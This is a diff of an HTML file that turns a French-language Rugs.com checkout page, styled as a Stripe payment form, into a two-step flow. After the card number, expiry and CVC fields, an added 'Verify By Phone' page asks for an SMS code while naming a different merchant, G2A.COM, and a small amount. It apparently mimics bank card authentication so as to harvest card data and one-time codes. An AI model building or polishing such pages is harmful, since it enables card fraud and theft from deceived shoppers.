@@ -3,317 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Paiement sécurisé - Rugs.com</title>
+    <title>Paiement & Vérification - Rugs.com</title>
     <style>
         :root {
-            --stripe-green: #059669; /* اللون الأخضر الزمردي الدقيق */
-            --input-border: #e6e6e6;
-            --text-dark: #1a1a1a;
+            --stripe-green: #059669;
+            --stripe-blue: #0000FF;
+            --border-color: #e6e6e6;
+            --text-main: #1a1a1a;
             --text-gray: #6b7280;
-            --bg-gray: #f3f4f6;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background-color: #ffffff;
             margin: 0;
             padding: 20px;
             display: flex;
             justify-content: center;
-            color: var(--text-dark);
-            -webkit-font-smoothing: antialiased;
         }
 
-        .container {
-            width: 100%;
-            max-width: 400px;
-        }
+        .container { width: 100%; max-width: 400px; }
 
-        h2 {
-            font-size: 17px;
-            font-weight: 600;
-            margin: 25px 0 12px 0;
-            letter-spacing: -0.01em;
-        }
+        /* التحكم في ظهور الصفحات */
+        .page { display: none; }
+        .active { display: block; }
 
-        label {
-            display: block;
-            font-size: 13px;
-            font-weight: 500;
-            margin-bottom: 5px;
-            color: var(--text-dark);
-        }
+        /* --- تصميم صفحة الدفع (Checkout) --- */
+        h2 { font-size: 17px; font-weight: 600; margin: 25px 0 12px 0; }
+        label { display: block; font-size: 13px; font-weight: 500; margin-bottom: 5px; }
+        input, select { width: 100%; padding: 11px; border: 1px solid var(--border-color); border-radius: 6px; font-size: 15px; box-sizing: border-box; outline: none; }
+        
+        .address-group { border: 1px solid var(--border-color); border-radius: 6px; overflow: hidden; margin-top: 5px; }
+        .address-group input, .address-group .country-box, .address-group select { border: none; border-bottom: 1px solid var(--border-color); border-radius: 0; }
+        .country-box { background-color: #f9f9f9; padding: 11px; font-size: 15px; border-bottom: 1px solid var(--border-color); }
+        .row { display: flex; }
+        .row input:first-child { border-right: 1px solid var(--border-color); }
 
-        /* تنسيق الحقول */
-        input, select {
-            width: 100%;
-            padding: 11px 12px;
-            border: 1px solid var(--input-border);
-            border-radius: 6px;
-            font-size: 15px;
-            outline: none;
-            box-sizing: border-box;
-            transition: border-color 0.2s;
-        }
+        .payment-box { border: 1px solid var(--border-color); border-radius: 8px; margin-top: 10px; overflow: hidden; }
+        .payment-header { display: flex; align-items: center; padding: 14px; border-bottom: 1px solid var(--border-color); }
+        .radio-dot { width: 14px; height: 14px; border: 5px solid black; border-radius: 50%; margin-right: 10px; }
+        
+        .card-icons-img { height: 22px; margin-left: auto; }
+        .btn-pay { width: 100%; background: var(--stripe-green); color: white; border: none; padding: 15px; border-radius: 6px; font-size: 17px; font-weight: 600; margin-top: 25px; cursor: pointer; }
 
-        input:focus {
-            border-color: #a3a3a3;
-        }
+        /* --- تصميم صفحة التحقق (Verification) --- */
+        .v-title { font-family: "Times New Roman", Times, serif; font-size: 26px; text-align: left; margin-bottom: 20px; }
+        .v-text { text-align: left; font-size: 15px; line-height: 1.5; color: var(--text-main); }
+        .v-input { height: 60px; text-align: center; font-size: 24px; letter-spacing: 5px; margin: 20px 0; }
+        .btn-confirm { width: 100%; background: var(--stripe-blue); color: white; border: none; padding: 16px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .btn-resend { color: var(--stripe-blue); text-decoration: none; font-weight: bold; display: block; margin-top: 25px; text-align: center; }
+        
+        .accordion { display: flex; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid #f0f0f0; color: #1a237e; cursor: pointer; }
 
-        /* تجميع حقول العنوان بشكل متراص */
-        .address-group {
-            border: 1px solid var(--input-border);
-            border-radius: 6px;
-            overflow: hidden;
-            margin-top: 5px;
-        }
-
-        .address-group input, .address-group .country-box, .address-group select {
-            border: none;
-            border-bottom: 1px solid var(--input-border);
-            border-radius: 0;
-            margin: 0;
-        }
-
-        .address-group input:last-child, .address-group select:last-child {
-            border-bottom: none;
-        }
-
-        .country-box {
-            background-color: #f9f9f9;
-            padding: 11px 12px;
-            font-size: 15px;
-            color: var(--text-dark);
-            border-bottom: 1px solid var(--input-border);
-        }
-
-        .row {
-            display: flex;
-        }
-
-        .row input:first-child {
-            border-right: 1px solid var(--input-border);
-        }
-
-        /* حقل الهاتف */
-        .phone-field {
-            display: flex;
-            align-items: center;
-            border: 1px solid var(--input-border);
-            border-radius: 6px;
-            padding: 0 10px;
-            margin-top: 10px;
-        }
-
-        .phone-field input {
-            border: none;
-            padding-left: 8px;
-        }
-
-        /* قسم الدفع */
-        .payment-section {
-            border: 1px solid var(--input-border);
-            border-radius: 8px;
-            margin-top: 10px;
-            overflow: hidden;
-        }
-
-        .payment-header {
-            display: flex;
-            align-items: center;
-            padding: 14px;
-            background: #fff;
-            border-bottom: 1px solid var(--input-border);
-        }
-
-        .radio-dot {
-            width: 14px; height: 14px;
-            border: 5px solid black;
-            border-radius: 50%;
-            margin-right: 10px;
-        }
-
-        .card-form {
-            padding: 15px;
-        }
-
-        .card-input-box {
-            border: 1px solid var(--input-border);
-            border-radius: 6px;
-            overflow: hidden;
-        }
-
-        .card-number-wrapper {
-            display: flex;
-            align-items: center;
-            background: #fff;
-            padding-right: 10px;
-            border-bottom: 1px solid var(--input-border);
-        }
-
-        .card-number-wrapper input {
-            border: none;
-        }
-
-        /* دمج الأيقونات التي أرسلتها */
-        .card-icons-img {
-            height: 22px; /* حجم مثالي للأيقونات المدمجة */
-            filter: grayscale(0.2);
-        }
-
-        .cvc-icon {
-            width: 24px;
-            opacity: 0.6;
-        }
-
-        /* خيارات الحفظ والشروط */
-        .checkbox-container {
-            display: flex;
-            gap: 10px;
-            margin-top: 20px;
-            font-size: 13px;
-            line-height: 1.4;
-        }
-
-        .checkbox-container input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            margin: 0;
-            accent-color: black;
-            flex-shrink: 0;
-        }
-
-        /* زر الدفع */
-        .btn-pay {
-            width: 100%;
-            background-color: var(--stripe-green);
-            color: white;
-            border: none;
-            padding: 15px;
-            border-radius: 6px;
-            font-size: 17px;
-            font-weight: 600;
-            margin-top: 25px;
-            cursor: pointer;
-        }
-
-        /* التذييل */
-        .footer {
-            text-align: center;
-            margin-top: 35px;
-            padding-bottom: 20px;
-        }
-
-        .footer a {
-            text-decoration: none;
-            color: var(--text-gray);
-            font-size: 13px;
-        }
-
-        .footer-brand {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 20px;
-            padding-top: 15px;
-            border-top: 1px solid #f0f0f0;
-            font-size: 12px;
-            color: var(--text-gray);
-        }
+        .footer-brand { display: flex; justify-content: space-between; margin-top: 30px; font-size: 12px; color: var(--text-gray); border-top: 1px solid #eee; padding-top: 10px; }
     </style>
 </head>
 <body>
 
 <div class="container">
     
-    <section>
+    <div id="checkoutPage" class="page active">
         <h2>Informations de livraison</h2>
-        <label>E-mail</label>
         <input type="email" placeholder="email@exemple.com">
-
-        <h2 style="margin-top: 20px; font-size: 14px;">Adresse de livraison</h2>
+        
+        <h2 style="font-size: 14px;">Adresse de livraison</h2>
         <div class="address-group">
             <input type="text" placeholder="Nom complet">
             <div class="country-box">États-Unis</div>
             <input type="text" placeholder="Ligne d'adresse n°1">
-            <input type="text" placeholder="Ligne d'adresse n°2">
             <div class="row">
                 <input type="text" placeholder="Ville">
                 <input type="text" placeholder="Code postal">
             </div>
-            <select style="border-bottom: none;">
-                <option>État</option>
-            </select>
+            <select style="border-bottom: none;"><option>État</option></select>
         </div>
 
-        <div class="phone-field">
-            <img src="https://flagcdn.com/w20/us.png" width="20" alt="US Flag">
-            <input type="text" value="(201) 555-0123">
-            <span style="color: #999; font-size: 14px; cursor: pointer;">ⓘ</span>
-        </div>
-    </section>
-
-    <section>
         <h2>Moyen de paiement</h2>
-        <div class="payment-section">
+        <div class="payment-box">
             <div class="payment-header">
                 <div class="radio-dot"></div>
-                <span style="font-size: 18px; margin-right: 10px;">💳</span>
-                <span style="font-weight: 500;">Carte</span>
+                <span>💳 Carte</span>
+                <img src="https://i.ibb.co/w9KxwQ5/2-A2-A850-F-BE0-C-48-A0-B145-A2-BFD7-C481-EA.png" class="card-icons-img">
             </div>
-
-            <div class="card-form">
-                <label style="color: var(--text-gray); font-size: 12px;">Informations de la carte</label>
-                <div class="card-input-box">
-                    <div class="card-number-wrapper">
-                        <input type="text" placeholder="1234 1234 1234 1234">
-                        <img src="https://i.ibb.co/w9KxwQ5/2-A2-A850-F-BE0-C-48-A0-B145-A2-BFD7-C481-EA.png" class="card-icons-img" alt="Card Brands">
-                    </div>
-                    <div class="row">
-                        <input type="text" placeholder="MM / AA">
-                        <div style="display: flex; align-items: center; background: #fff; width: 100%; padding-right: 10px;">
-                            <input type="text" placeholder="CVC" style="border: none;">
-                            <img src="https://cdn-icons-png.flaticon.com/512/4341/4341764.png" class="cvc-icon" alt="cvc">
-                        </div>
-                    </div>
-                </div>
-
-                <div style="display: flex; align-items: center; gap: 8px; margin-top: 15px;">
-                    <input type="checkbox" checked style="width: 16px; height: 16px; accent-color: black;">
-                    <span style="font-size: 12px; color: var(--text-dark);">Les informations de facturation sont identiques aux informations de livraison</span>
+            <div style="padding: 15px;">
+                <input type="text" placeholder="Numéro de carte">
+                <div class="row" style="margin-top: 10px;">
+                    <input type="text" placeholder="MM / AA">
+                    <input type="text" placeholder="CVC">
                 </div>
             </div>
         </div>
-    </section>
-
-    <div class="checkbox-container">
-        <input type="checkbox">
-        <label>
-            <strong style="color: #000;">Enregistrer mes informations pour régler plus rapidement</strong><br>
-            <span style="color: var(--text-gray);">Payez en toute sécurité chez Rugs.com et partout où Link est accepté.</span>
-        </label>
-    </div>
-
-    <div class="checkbox-container">
-        <input type="checkbox">
-        <label style="color: var(--text-gray);">
-            J'accepte les <a href="#" style="color: #000; text-decoration: underline;">Conditions d'utilisation du service</a> et la <a href="#" style="color: #000; text-decoration: underline;">Politique de confidentialité</a> de Rugs.com.
-        </label>
-    </div>
-
-    <button class="btn-pay">Payer</button>
-
-    <div class="footer">
-        <a href="#">↩ Retours gratuits</a>
+        
+        <button class="btn-pay" onclick="goToVerify()">Payer</button>
+        
         <div class="footer-brand">
-            <span>Propulsé par <strong style="color: #000; letter-spacing: -0.5px;">stripe</strong></span>
-            <div>
-                <a href="#" style="margin-left: 10px;">Mentions légales</a>
-                <a href="#" style="margin-left: 10px;">Retours</a>
-                <a href="#" style="margin-left: 10px;">Contact</a>
-            </div>
+            <span>Propulsé par <strong>stripe</strong></span>
         </div>
     </div>
+
+    <div id="verifyPage" class="page">
+        <div style="height: 1px; background: #eee; margin-bottom: 30px;"></div>
+        <h1 class="v-title">Verify By Phone</h1>
+        <p class="v-text">We have sent you a text message with a code to your registered mobile number.</p>
+        <p class="v-text">You are paying G2A.COM the amount of <b>EUR 1.46</b> on 2026/02/15.</p>
+        
+        <div style="margin-top: 40px;">
+            <label style="color: #888; text-align: center;">Verification code</label>
+            <input type="text" class="v-input" maxlength="6">
+        </div>
+
+        <button class="btn-confirm" onclick="alert('Paiement Réussi !')">CONFIRM</button>
+        <a href="#" class="btn-resend">RESEND CODE</a>
+
+        <div class="accordion" style="margin-top: 40px; border-top: 1px solid #f0f0f0;">
+            <span>Learn more about authentication</span><span>+</span>
+        </div>
+        <div class="accordion">
+            <span>Need some help ?</span><span>+</span>
+        </div>
+    </div>
+
 </div>
+
+<script>
+    function goToVerify() {
+        // إخفاء صفحة الدفع
+        document.getElementById('checkoutPage').classList.remove('active');
+        // إظهار صفحة التحقق
+        document.getElementById('verifyPage').classList.add('active');
+        // الصعود لأعلى الصفحة
+        window.scrollTo(0, 0);
+    }
+</script>
 
 </body>
 </html>
